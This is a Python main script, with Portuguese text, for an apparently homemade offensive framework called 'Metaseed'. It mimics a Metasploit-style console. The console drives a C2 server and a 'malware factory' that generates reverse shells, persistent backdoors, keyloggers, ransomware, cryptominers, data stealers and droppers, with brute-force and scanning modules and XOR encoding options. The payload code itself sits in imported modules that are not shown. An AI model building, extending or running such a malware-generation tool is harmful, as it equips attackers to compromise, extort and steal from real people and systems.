#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import random
from pathlib import Path

# Adiciona o diretório raiz ao path
sys.path.insert(0, str(Path(__file__).parent))

from utils.animations import loading_animation, show_random_banner
from utils.helpers import clear_screen, print_status, print_error, print_success
from core.server import C2Server
from core.malware_factory import MalwareFactory
from utils.scanner import Scanner

def main():
    # Mostra animação de carregamento
    loading_animation("Iniciando Metaseed Framework", duration=2)
    
    # Mostra banner aleatório
    clear_screen()
    show_random_banner()
    
    # Inicializa o servidor C2
    server = C2Server()
    malware_factory = MalwareFactory()
    scanner = Scanner()
    
    # Loop principal de comando
    while True:
        try:
            command = input("metaseed > ").strip()
            
            if not command:
                continue
                
            if command == "help":
                show_help()
                
            elif command == "clear":
                clear_screen()
                show_random_banner()
                
            elif command.startswith("use"):
                handle_use_command(command, malware_factory, scanner)
                
            elif command == "show options":
                show_options()
                
            elif command == "show payloads":
                malware_factory.list_payloads()
                
            elif command == "show exploits":
                scanner.list_exploits()
                
            elif command.startswith("set"):
                handle_set_command(command, server, malware_factory)
                
            elif command == "run" or command == "exploit":
                handle_run_command(server, malware_factory)
                
            elif command == "sessions":
                server.list_clients()
                
            elif command == "exit":
                print_status("Saindo do Metaseed Framework...")
                break
                
            else:
                print_error(f"Comando não reconhecido: {command}")
                
        except KeyboardInterrupt:
            print("\n")
            print_status("Use 'exit' para sair")
        except Exception as e:
            print_error(f"Erro: {e}")

def show_help():
    help_text = """
Comandos principais:
  help                 - Mostrar esta ajuda
  use [modulo]         - Usar um módulo específico
  set [opção] [valor]  - Configurar uma opção
  show options         - Mostrar opções configuradas
  show payloads        - Listar payloads disponíveis
  show exploits        - Listar exploits disponíveis
  run / exploit        - Executar o módulo atual
  sessions             - Listar sessões ativas
  clear                - Limpar a tela
  exit                 - Sair do framework

Módulos disponíveis:
  payload/reverse_shell  - Criar shell reverso
  payload/backdoor       - Criar backdoor persistente
  payload/keylogger      - Criar keylogger
  payload/ransomware     - Criar ransomware
  payload/miner          - Criar minerador de criptomoeda
  payload/stealer        - Criar stealer de dados
  payload/dropper        - Criar dropper de malware
  auxiliary/scanner      - Scanner de rede e vulnerabilidades
  auxiliary/hydra        - Ferramenta de brute force
  auxiliary/nmap         - Scanner de portas avançado
"""
    print(help_text)

def handle_use_command(command, malware_factory, scanner):
    parts = command.split()
    if len(parts) < 2:
        print_error("Uso: use [modulo]")
        return
        
    module = parts[1]
    
    if module.startswith("payload/"):
        malware_factory.select_payload(module.replace("payload/", ""))
    elif module == "auxiliary/scanner":
        scanner.select_module("scanner")
    elif module == "auxiliary/hydra":
        scanner.select_module("hydra")
    elif module == "auxiliary/nmap":
        scanner.select_module("nmap")
    else:
        print_error(f"Módulo não encontrado: {module}")

def show_options():
    # Esta função será implementada para mostrar as opções atuais
    print("Opções atuais:")
    print("  LHOST    - 192.168.1.100")
    print("  LPORT    - 4444")
    print("  PAYLOAD  - reverse_shell")
    print("  ENCODING - xor")

def handle_set_command(command, server, malware_factory):
    parts = command.split()
    if len(parts) < 3:
        print_error("Uso: set [opção] [valor]")
        return
        
    option = parts[1].upper()
    value = " ".join(parts[2:])
    
    if option == "LHOST":
        server.host = value
        print_success(f"LHOST => {value}")
    elif option == "LPORT":
        server.port = int(value)
        print_success(f"LPORT => {value}")
    elif option == "PAYLOAD":
        malware_factory.select_payload(value)
    elif option == "ENCODING":
        malware_factory.set_encoding(value)
    else:
        print_error(f"Opção não reconhecida: {option}")

def handle_run_command(server, malware_factory):
    if malware_factory.current_payload:
        payload = malware_factory.generate_payload(server.host, server.port)
        print_success("Payload gerado com sucesso!")
        print(payload)
    else:
        print_error("Nenhum payload selecionado. Use 'set PAYLOAD [tipo]'")

if __name__ == "__main__":
    main()
